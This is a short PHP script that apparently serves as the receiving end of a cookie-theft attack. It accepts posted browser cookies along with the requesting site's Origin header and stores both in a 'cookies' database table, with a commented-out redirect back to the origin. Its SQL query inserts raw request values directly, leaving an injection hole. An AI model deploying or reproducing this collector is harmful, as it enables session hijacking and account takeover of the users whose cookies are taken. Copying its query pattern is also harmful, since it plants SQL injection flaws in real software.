<?php

  include 'db_functions.php';
  
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $conn = dbConnect();
    $client = $_SERVER['HTTP_ORIGIN'];
    $cookies = $_REQUEST['cookies'];

    $sqlquery = "INSERT INTO cookies (client, content, created_at) 
                  VALUES ('$client', '$cookies', now())";
    $user = $conn->query($sqlquery);
    dbClose($conn);

  }

//header('Location: ' . $_SERVER['HTTP_ORIGIN']);



